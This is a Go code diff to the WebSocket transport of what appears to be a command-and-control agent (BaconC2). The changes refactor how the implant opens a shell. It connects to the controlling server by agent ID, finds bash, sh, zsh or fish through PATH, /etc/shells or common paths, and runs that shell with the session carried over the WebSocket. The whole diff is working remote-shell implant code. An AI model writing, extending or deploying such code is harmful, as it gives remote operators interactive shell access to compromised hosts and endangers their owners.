@@ -1,11 +1,15 @@
 package transport
 
 import (
+	"bufio"
 	"context"
 	"fmt"
 	"log"
+	"os"
 	"os/exec"
-	"runtime"
+	"path"
+	"path/filepath"
+	"strings"
 	"sync"
 
 	"github.com/RabbITCybErSeC/BaconC2/client/models"
@@ -23,6 +27,7 @@ type WebSocketTransport struct {
 	ctx       context.Context
 	cancel    context.CancelFunc
 	mutex     sync.Mutex
+	shells    []string
 }
 
 func NewWebSocketTransport(serverURL, agentID string) models.IStreamingTransport {
@@ -31,11 +36,12 @@ func NewWebSocketTransport(serverURL, agentID string) models.IStreamingTransport
 		serverURL: serverURL,
 		agentID:   agentID,
 		ctx:       ctx,
-		cancel:    cancel,
+
+		cancel: cancel,
 	}
 }
 
-func (t *WebSocketTransport) StartStreamingSession(sessionType string, config map[string]interface{}, resultChan chan<- models.CommandResult) error {
+func (t *WebSocketTransport) StartStreamingSession(sessionType string, config models.StreamingConfig, resultChan chan<- models.CommandResult) error {
 	if sessionType != "shell" {
 		err := fmt.Errorf("unsupported session type: %s", sessionType)
 		resultChan <- models.CommandResult{
@@ -46,11 +52,18 @@ func (t *WebSocketTransport) StartStreamingSession(sessionType string, config ma
 		return err
 	}
 
-	shellType, _ := config["shell_type"].(string)
-	if shellType == "" {
-		shellType = "cmd" // Default
+	shellType := config.ShellType
+	if shellType == models.ShellTypeUnknown {
+		err := fmt.Errorf("invalid shell type: %s", shellType)
+		resultChan <- models.CommandResult{
+			ID:     "session_start",
+			Status: "error",
+			Output: map[string]string{"error": err.Error()},
+		}
+		return err
 	}
 
+	// Establish WebSocket connection
 	wsURL := fmt.Sprintf(wsShellPath, t.serverURL, t.agentID)
 	conn, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
 	if err != nil {
@@ -66,7 +79,8 @@ func (t *WebSocketTransport) StartStreamingSession(sessionType string, config ma
 	t.conn = conn
 	t.mutex.Unlock()
 
-	cmd, err := startShellProcess(shellType)
+	// Start shell process
+	cmd, err := t.startShellProcess(shellType, config)
 	if err != nil {
 		t.CloseSession("shell")
 		resultChan <- models.CommandResult{
@@ -77,7 +91,7 @@ func (t *WebSocketTransport) StartStreamingSession(sessionType string, config ma
 		return fmt.Errorf("failed to start shell: %w", err)
 	}
 
-	go t.handleShellSession(cmd, resultChan)
+	go t.handleShellSession(cmd, resultChan, config)
 
 	resultChan <- models.CommandResult{
 		ID:     "session_start",
@@ -85,6 +99,69 @@ func (t *WebSocketTransport) StartStreamingSession(sessionType string, config ma
 		Output: map[string]string{"message": "Shell session started"},
 	}
 	return nil
+}
+
+func (t *WebSocketTransport) initShells() {
+	goodShells := []string{"zsh", "bash", "fish", "sh"}
+	potentialShells := []string{}
+
+	// Try known good shells
+	for _, shell := range goodShells {
+		if path, err := exec.LookPath(shell); err == nil {
+			potentialShells = append(potentialShells, path)
+		}
+	}
+
+	// If none found, try /etc/shells
+	if len(potentialShells) == 0 {
+		if shells, err := getSystemShells(); err == nil {
+			potentialShells = append(potentialShells, shells...)
+		} else {
+			// Last resort: common paths
+			for _, shell := range goodShells {
+				potentialShells = append(potentialShells,
+					path.Join("/opt/bin/", shell),
+					path.Join("/opt/", shell),
+					path.Join("/usr/local/bin/", shell),
+					path.Join("/usr/local/sbin/", shell),
+					path.Join("/usr/bin/", shell),
+					path.Join("/bin/", shell),
+					path.Join("/sbin/", shell),
+				)
+			}
+		}
+	}
+
+	// Filter valid shells
+	for _, s := range potentialShells {
+		if stats, err := os.Stat(s); err == nil && !stats.IsDir() {
+			t.shells = append(t.shells, s)
+		}
+	}
+}
+
+func getSystemShells() ([]string, error) {
+	file, err := os.Open("/etc/shells")
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	potentialShells := []string{}
+	goodShells := map[string]bool{"zsh": true, "bash": true, "fish": true, "sh": true}
+
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if len(line) == 0 || line[0] == '#' {
+			continue
+		}
+		if goodShells[filepath.Base(line)] {
+			potentialShells = append(potentialShells, line)
+		}
+	}
+
+	return potentialShells, scanner.Err()
 }
 
 func (t *WebSocketTransport) CloseSession(sessionID string) error {
@@ -205,20 +282,38 @@ func (t *WebSocketTransport) sendMessage(msg models.WebSocketMessage) error {
 	return t.conn.WriteJSON(msg)
 }
 
-func startShellProcess(shellType string) (*exec.Cmd, error) {
-	if runtime.GOOS == "windows" {
+func (t *WebSocketTransport) startShellProcess(shellType models.ShellType, config models.StreamingConfig) (*exec.Cmd, error) {
+	shellPath := ""
+	for _, shell := range t.shells {
+		base := filepath.Base(shell)
 		switch shellType {
-		case "powershell":
-			return exec.Command("powershell.exe"), nil
-		default:
-			return exec.Command("cmd.exe"), nil
+		case models.ShellTypeBash:
+			if base == "bash" {
+				shellPath = shell
+			}
+		case models.ShellTypeSh:
+			if base == "sh" {
+				shellPath = shell
+			}
+		case models.ShellTypeZsh:
+			if base == "zsh" {
+				shellPath = shell
+			}
+		case models.ShellTypeFish:
+			if base == "fish" {
+				shellPath = shell
+			}
 		}
-	} else {
-		// Simplified; use github.com/creack/pty for full PTY support
-		cmd := exec.Command("/bin/sh")
-		if shellType == "bash" {
-			cmd = exec.Command("/bin/bash")
+		if shellPath != "" {
+			break
 		}
-		return cmd, nil
 	}
+
+	if shellPath == "" {
+		return nil, fmt.Errorf("no suitable shell found for type: %s", shellType)
+	}
+
+	cmd := exec.Command(shellPath)
+	cmd.Env = append(os.Environ(), "TERM="+config.Term)
+	return cmd, nil
 }
